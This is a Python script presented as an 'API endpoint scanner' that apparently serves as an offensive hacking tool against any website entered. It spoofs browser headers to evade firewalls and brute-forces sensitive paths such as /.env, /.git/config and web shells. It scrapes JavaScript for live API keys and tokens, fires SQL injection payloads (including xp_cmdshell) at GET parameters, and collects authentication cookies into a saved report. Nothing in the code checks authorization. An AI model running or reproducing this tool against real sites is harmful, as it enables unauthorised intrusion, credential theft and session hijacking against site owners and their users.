#Coded By Rolandino7
import requests
import re
import time
import json
import hashlib
import base64
import random
import string
import urllib3
import socket
import os
import sys
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from collections import defaultdict
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.rule import Rule
    from rich.prompt import Prompt, Confirm
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("Rich not installed. Install with: pip install rich")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if not RICH_AVAILABLE:
    class Console:
        def __init__(self): pass
        def print(self, text): print(text)
        def input(self, prompt): return input(prompt)

console = Console()

class UltimateWAFBypass:
    def __init__(self):
        self.ua_pool = [
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ]
    
    def get_stealth_headers(self, referer=None, api=False):
        headers = {
            "User-Agent": random.choice(self.ua_pool),
            "Accept": "*/*" if api else "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Sec-Fetch-Dest": "document" if not api else "empty",
            "Sec-Fetch-Mode": "navigate" if not api else "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
            "Sec-Ch-Ua-Mobile": "?1" if random.random() > 0.5 else "?0",
            "Sec-Ch-Ua-Platform": '"Android"' if random.random() > 0.5 else '"Windows"'
        }
        if referer:
            headers["Referer"] = referer
        return headers

class SQLiDetector:
    def __init__(self):
        self.payloads = [
            "' OR 1=1--",
            "' OR '1'='1",
            "1' OR '1'='1",
            "' UNION SELECT NULL--",
            "' OR SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "';EXEC xp_cmdshell('ping 127.0.0.1')--",
            "' OR 1=1#",
            "1' ORDER BY 100--",
            "1 AND 1=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(106)||CHR(113))(SELECT (CASE WHEN (1178=1178) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(116)||CHR(98)||CHR(113)) AS NUMERIC)--1"
        ]
        self.error_patterns = [
            r"mysql_fetch",
            r"sql syntax",
            r"ORA-.*exception",
            r"PostgreSQL.*ERROR",
            r"Warning.*mysql",
            r"You have an error in your SQL syntax",
            r"Microsoft OLE DB Provider for ODBC Drivers error",
            r"Invalid query",
            r"ODBC.*driver",
            r"unexpected end of query",
            r"syntax error",
            r"SQLServer JDBC Driver"
        ]
    
    def test_sqli(self, url, session):
        """Test SQL Injection on GET parameters"""
        try:
            parsed = urlparse(url)
            if not parsed.query:
                return None
            
            params = parse_qs(parsed.query)
            base_resp = session.get(url, timeout=8)
            base_len = len(base_resp.text)
            base_time = time.time()
            
            for param in list(params.keys())[:3]:  
                original_value = params[param][0]
                test_url = parsed._replace(query=urllib.parse.urlencode({param: original_value + "'"}, doseq=True)).geturl()
                
                for payload in self.payloads[:3]:  
                    sqli_url = parsed._replace(query=urllib.parse.urlencode({param: original_value + payload}, doseq=True)).geturl()
                    start_time = time.time()
                    
                    resp = session.get(sqli_url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    
                    if elapsed > 4:
                        return {'url': sqli_url, 'type': 'TIME-BASED', 'param': param, 'payload': payload}
                    
                    
                    for error_pattern in self.error_patterns:
                        if re.search(error_pattern, resp.text, re.IGNORECASE):
                            return {'url': sqli_url, 'type': 'ERROR-BASED', 'param': param, 'payload': payload}
                    
                    
                    if abs(len(resp.text) - base_len) > 100:
                        return {'url': sqli_url, 'type': 'UNION-BASED', 'param': param, 'payload': payload}
        except:
            pass
        return None

class UltimateSessionThief:
    def __init__(self):
        self.admin_cookies = {}
    
    def steal_session(self, target, session):
        admin_paths = [
            '/admin', '/dashboard', '/login', '/auth', '/cpanel', '/panel', 
            '/admin/login', '/admin/dashboard', '/account', '/user', '/profile',
            '/wp-admin', '/administrator', '/backend', '/management'
        ]
        for path in admin_paths:
            try:
                test_url = urljoin(target, path)
                resp = session.get(test_url, timeout=8, allow_redirects=True)
                for cookie in resp.cookies:
                    if any(x in cookie.name.lower() for x in ['session', 'auth', 'admin', 'token', 'user', 'phpmyadmin']):
                        self.admin_cookies[cookie.name] = cookie.value
            except:
                continue

class UltimateAPIHunter:
    def __init__(self):
        self.waf = UltimateWAFBypass()
        self.sqli_detector = SQLiDetector()
        self.session_thief = UltimateSessionThief()
        self.session = requests.Session()
        self.session.verify = False
        self.live_endpoints = []
        self.live_keys = []
        self.sql_endpoints = []
        self.mapped_endpoints = defaultdict(list)
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}
    
    
    ULTRA_MEGA_PATHS = [
        
        '/api', '/api/v1', '/api/v2', '/api/v3', '/api/v4', '/api/v5', '/api/latest', '/api/beta', '/api/dev',
        '/api/admin', '/api/users', '/api/user', '/api/profile', '/api/auth', '/api/login', '/api/logout',
        '/api/register', '/api/password', '/api/reset', '/api/verify', '/api/token', '/api/oauth',
        '/api/orders', '/api/products', '/api/cart', '/api/checkout', '/api/payment', '/api/subscription',
        '/api/internal', '/api/private', '/api/public', '/api/graphql', '/api/rest', '/api/rpc',
        '/v1', '/v2', '/v3', '/v4', '/v5', '/beta', '/alpha', '/dev', '/staging', '/test',
        
        
        '/admin', '/administrator', '/admin.php', '/admin.html', '/admin/login', '/admin/index.php',
        '/dashboard', '/panel', '/cpanel', '/wp-admin', '/wp-login.php', '/user', '/users',
        '/manager', '/manage', '/management', '/backend', '/console', '/control', '/controlpanel',
        '/superadmin', '/siteadmin', '/moderator', '/login', '/auth', '/account', '/profile',
        
        
        '/wp-json', '/wp-content', '/wp-includes', '/drupal', '/joomla', '/magento', '/laravel',
        '/cake', '/cakephp', '/django', '/flask', '/rails', '/express', '/phpmyadmin', '/dbadmin',
        
        
        '/.env', '/config', '/config.php', '/config.json', '/config.yaml', '/config.yml',
        '/.env.local', '/.env.production', '/.env.development', '/secrets', '/credentials',
        '/keys', '/certs', '/ssl', '/backup', '/backups', '/dump', '/database', '/db',
        
        
        '/debug', '/health', '/status', '/metrics', '/ping', '/uptime', '/info', '/version',
        '/logs', '/log', '/error', '/errors', '/trace', '/test', '/sandbox', '/staging',
        
        
        '/api-docs', '/swagger', '/swagger.json', '/swagger.yaml', '/openapi', '/openapi.json',
        '/docs', '/documentation', '/redoc', '/api/v1/docs', '/v2/docs', '/graphql/voyager',
        
        
        '/robots.txt', '/sitemap.xml', '/security.txt', '/humans.txt', '/crossdomain.xml',
        '/.git/config', '/.gitignore', '/.dockerignore', '/docker-compose.yml', '/package.json',
        
        
        '/prometheus', '/grafana', '/newrelic', '/sentry', '/datadog', '/monitoring', '/alerts',
        
        
        '/shop', '/store', '/cart', '/checkout', '/billing', '/invoice', '/orders', '/products',
        
        
        '/shell.php', '/web-shell.php', '/upload.php', '/uploader.php', '/filemanager'
    ]
    
    PATTERNS = {
        'API_ENDPOINTS': [
            r'["\']((?:https?://[^"\s<>]+)|(?:/[^\s<>"\'{}]+(?:\?[^\s<>"\'{}]*|\.[a-zA-Z0-9]+)?))["\'][^{}]*?(?:get|post|put|delete|fetch|axios|\$\.ajax|\$\.get)',
            r'(?:url|endpoint|path|route|baseURL)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'api[./]([^"\s<>]+)',
            r'(/graphql|/api/graphql|graphql\.json|/v\d+/|/rest/|/rpc/)',
            r'window\.__API(?:_BASE|_URL|_CONFIG)?\s*[=:]\s*["\']([^"\']+)',
            r'["\'](/api/[^\s\'"]+)["\']',
            r'endpoint["\']?\s*:\s*["\']([^"\']+)',
            r'"([^"]*api[^"]*)"',
            r"'([^']*api[^']*)'",
            r'fetch\s*\(\s*["\']([^"\']+)',
        ],
        'API_KEYS': [
            r'(?:api[_-]?key|apikey|api_key|key|token|secret)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{20,})["\']',
            r'(eyJ[A-Za-z0-9\-_.]+?\.eyJ[A-Za-z0-9\-_.]+?\.[A-Za-z0-9\-_.]+)',
            r'AKIA[0-9A-Z]{16}',
            r'pk_live_[0-9a-zA-Z]{24}',
            r'sk_live_[0-9a-zA-Z]{24}',
            r'(ghp_[0-9a-zA-Z]{36})',
            r'AIza[0-9A-Za-z\-_]{35}',
            r'Bearer\s+([a-zA-Z0-9\-_.]{30,})',
            r'(?i)key[:\s]*["\']?([A-Za-z0-9]{32,}["\']?)'
        ]
    }
    
    def smart_request(self, url, method='GET', max_retries=3):
        for attempt in range(max_retries):
            try:
                if method == 'GET':
                    resp = self.session.get(
                        url, 
                        headers=self.waf.get_stealth_headers(url),
                        timeout=10,
                        allow_redirects=True
                    )
                else:
                    resp = self.session.request(
                        method, url,
                        headers=self.waf.get_stealth_headers(url, api=True),
                        timeout=10
                    )
                
                self.stats['requests'] += 1
                if resp.status_code < 500:
                    self.stats['success'] += 1
                    return resp
                time.sleep(0.3 * attempt)
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(1 * attempt)
        return None
    
    def ultimate_hunt(self, target):
        console.print(f"[green]Target Terdeteksi : {target}[/]")
        
        
        self._stage_recon(target)
        
        
        self._stage_js_mining(target)
        
        
        self._stage_mega_bruteforce(target)
        
        
        self._stage_sqli_hunting()
        
        
        self.session_thief.steal_session(target, self.session)
        
        self._display_results(target)
    
    def _stage_recon(self, target):
        if RICH_AVAILABLE:
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeElapsedColumn()) as progress:
                task = progress.add_task("Main Recon", total=6)
                
                resp = self.smart_request(target)
                if resp:
                    self._extract_patterns(resp.text, target)
                progress.advance(task)
                
                for path in ['/robots.txt', '/sitemap.xml', '/security.txt', '/humans.txt']:
                    resp = self.smart_request(urljoin(target, path))
                    if resp:
                        self._extract_patterns(resp.text, target)
                    progress.advance(task)
        else:
            print("Main Recon")
            resp = self.smart_request(target)
            if resp:
                self._extract_patterns(resp.text, target)
    
    def _stage_js_mining(self, target):
        if RICH_AVAILABLE:
            with Progress() as progress:
                task = progress.add_task("JavaScript Mining", total=1)
                resp = self.smart_request(target)
                if resp:
                    js_files = self._extract_js_files(resp.text, target)
                    self._analyze_js_files(js_files)
                progress.advance(task)
        else:
            print("JS Mining...")
            resp = self.smart_request(target)
            if resp:
                js_files = self._extract_js_files(resp.text, target)
                self._analyze_js_files(js_files)
    
    def _stage_mega_bruteforce(self, target):
        if RICH_AVAILABLE:
            with Progress() as progress:
                task = progress.add_task("Mega Path Bruteforce", total=len(self.ULTRA_MEGA_PATHS)//10)
                batch_size = 10
                for i in range(0, len(self.ULTRA_MEGA_PATHS), batch_size):
                    batch = self.ULTRA_MEGA_PATHS[i:i+batch_size]
                    with ThreadPoolExecutor(max_workers=15) as executor:
                        futures = [executor.submit(self._test_path, urljoin(target, path)) for path in batch]
                        for future in as_completed(futures):
                            try:
                                result = future.result(timeout=12)
                                if result:
                                    self.live_endpoints.append(result)
                            except:
                                pass
                    progress.advance(task)
        else:
            print("Bruteforcing paths...")
            for path in self.ULTRA_MEGA_PATHS[:50]:  
                test_url = urljoin(target, path)
                resp = self.smart_request(test_url)
                if resp and resp.status_code in [200, 201, 400, 401, 403]:
                    self.live_endpoints.append({
                        'endpoint': test_url,
                        'method': 'GET',
                        'status': resp.status_code,
                        'size': len(resp.content),
                        'score': self._score_endpoint(test_url, resp),
                        'source': 'bruteforce'
                    })
    
    def _stage_sqli_hunting(self):
        console.print("[green]Menjalankan SQLi...[/]")
        high_value_endpoints = [ep for ep in self.live_endpoints if ep.get('status') in [200, 400, 401]]
        
        for endpoint in high_value_endpoints[:10]:  
            sqli_result = self.sqli_detector.test_sqli(endpoint['endpoint'], self.session)
            if sqli_result:
                self.sql_endpoints.append({
                    'endpoint': endpoint['endpoint'],
                    'sqli_url': sqli_result['url'],
                    'type': sqli_result['type'],
                    'param': sqli_result['param'],
                    'payload': sqli_result['payload'],
                    'score': 100
                })
                console.print(f"[bold red]SQLi FOUND : {sqli_result['type']} -> {sqli_result['url']}[/]")
    
    def _test_path(self, test_url):
        resp = self.smart_request(test_url)
        if resp and resp.status_code in [200, 201, 400, 401, 403]:
            return {
                'endpoint': test_url,
                'method': 'GET',
                'status': resp.status_code,
                'size': len(resp.content),
                'score': self._score_endpoint(test_url, resp),
                'source': 'bruteforce'
            }
        return None
    
    def _extract_js_files(self, html, base):
        try:
            soup = BeautifulSoup(html, 'html.parser')
            js_files = []
            for script in soup.find_all('script', src=True):
                js_url = urljoin(base, script['src'])
                if js_url.endswith('.js'):
                    js_files.append(js_url)
            return js_files[:20]
        except:
            return []
    
    def _analyze_js_files(self, js_files):
        def analyze_js(js_url):
            resp = self.smart_request(js_url)
            if resp:
                self._extract_patterns(resp.text, js_url)
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(analyze_js, js) for js in js_files]
            for future in as_completed(futures):
                try:
                    future.result(timeout=12)
                except:
                    pass
    
    def _extract_patterns(self, content, source):
        for category, patterns in self.PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]
                    
                    if category == 'API_ENDPOINTS' and len(match.strip()) > 5:
                        endpoint = urljoin(source, match.strip()) if not match.strip().startswith('http') else match.strip()
                        if endpoint not in [ep['endpoint'] for ep in self.live_endpoints]:
                            self.live_endpoints.append({
                                'endpoint': endpoint,
                                'source': source,
                                'score': self._score_endpoint(endpoint),
                                'method': 'GET'
                            })
                    elif category == 'API_KEYS' and len(match) > 20:
                        if match not in [k['key'] for k in self.live_keys]:
                            self.live_keys.append({
                                'type': 'API_KEY',
                                'key': match,
                                'source': source
                            })
    
    def _score_endpoint(self, endpoint, response=None):
        score = 60
        keywords = ['api', 'admin', 'auth', 'internal', 'graphql', 'v1', 'v2', 'v3', 'v4', 'db', 'sql']
        if any(kw in endpoint.lower() for kw in keywords):
            score += 25
        if response and response.status_code in [200, 401, 403]:
            score += 15
        if any(ext in endpoint.lower() for ext in ['json', '.env', 'config', 'admin', 'db']):
            score += 10
        return min(score + random.randint(0, 15), 100)
    
    def _display_results(self, target):
        
        if self.sql_endpoints:
            if RICH_AVAILABLE:
                sqli_table = Table(title="CRITICAL SQL INJECTIONS FOUND!", box=None, show_lines=True)
                sqli_table.add_column("Type", style="red", no_wrap=True)
                sqli_table.add_column("Endpoint", style="yellow")
                sqli_table.add_column("Payload", style="cyan")
                for sqli in self.sql_endpoints:
                    sqli_table.add_row(
                        sqli['type'],
                        sqli['sqli_url'][:60] + "...",
                        sqli['payload'][:40] + "..."
                    )
                console.print(sqli_table)
            else:
                print("\nCRITICAL SQLi FOUND :")
                for sqli in self.sql_endpoints:
                    print(f"  {sqli['type']} : {sqli['sqli_url']}")
        
        
        if RICH_AVAILABLE:
            table = Table(title="TOP 25 ENDPOINTS", box=None, show_lines=True)
            table.add_column("Score", style="magenta", justify="right", no_wrap=True)
            table.add_column("Method", style="cyan")
            table.add_column("Endpoint", style="white")
            table.add_column("Status", style="green")
            
            top_endpoints = sorted(self.live_endpoints, key=lambda x: x.get('score', 0), reverse=True)[:25]
            for ep in top_endpoints:
                endpoint_str = ep['endpoint'][:60] + "..." if len(ep['endpoint']) > 60 else ep['endpoint']
                table.add_row(
                    str(ep.get('score', 0)),
                    ep.get('method', 'GET'),
                    endpoint_str,
                    str(ep.get('status', 'N/A'))
                )
            console.print(table)
        else:
            print("\nENDPOINTS TERBAIK :")
            for ep in sorted(self.live_endpoints, key=lambda x: x.get('score', 0), reverse=True)[:10]:
                print(f"[{ep.get('score', 0)}] {ep['endpoint']}")
        
        
        if self.live_keys:
            if RICH_AVAILABLE:
                keys_table = Table(title="API KEYS FOUND", box=None)
                keys_table.add_column("Key", style="yellow")
                for key in self.live_keys[:15]:
                    key_str = key['key'][:50] + "..." if len(key['key']) > 50 else key['key']
                    keys_table.add_row(key_str)
                console.print(keys_table)
        
        
        total_vulns = len(self.sql_endpoints) + len(self.live_endpoints) + len(self.live_keys)
        console.print(f"[bold green]STATS: {self.stats['success']}/{self.stats['requests']} | {total_vulns} VULNS | {len(self.sql_endpoints)} SQLi[/]")
        
        self._save_report(target)
    
    def _save_report(self, target):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = urlparse(target).netloc
        filename = f"ULTIMATE_HUNT_{domain}_{timestamp}.json"
        
        results = {
            'target': target,
            'timestamp': timestamp,
            'sql_injections': self.sql_endpoints,
            'endpoints': self.live_endpoints,
            'api_keys': self.live_keys,
            'cookies': self.session_thief.admin_cookies,
            'stats': self.stats
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
            console.print(f"[green]Di Simpamn : {filename}[/]")
        except:
            pass

def banner():
    if RICH_AVAILABLE:
        console.print(Panel.fit(
            Text.from_markup("""[green]Api Endepoint Scanner | Coded By 𝕽𝖔𝖑𝖆𝖓𝖉𝖎𝖓𝖔[/]"""),
            border_style="white", padding=(1, 2)
        ))
    else:
        print(""" """)

def main():
    banner()
    
    target = console.input("[green]Target Website[/] : ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    if RICH_AVAILABLE:
        if Confirm.ask("[green]Mulai Uji Coba?[/]"):
            hunter = UltimateAPIHunter()
            hunter.ultimate_hunt(target)
    else:
        if input("\nMulai Uji Coba? (y/n) : ").lower() == 'y':
            hunter = UltimateAPIHunter()
            hunter.ultimate_hunt(target)

if __name__ == "__main__":
    main()
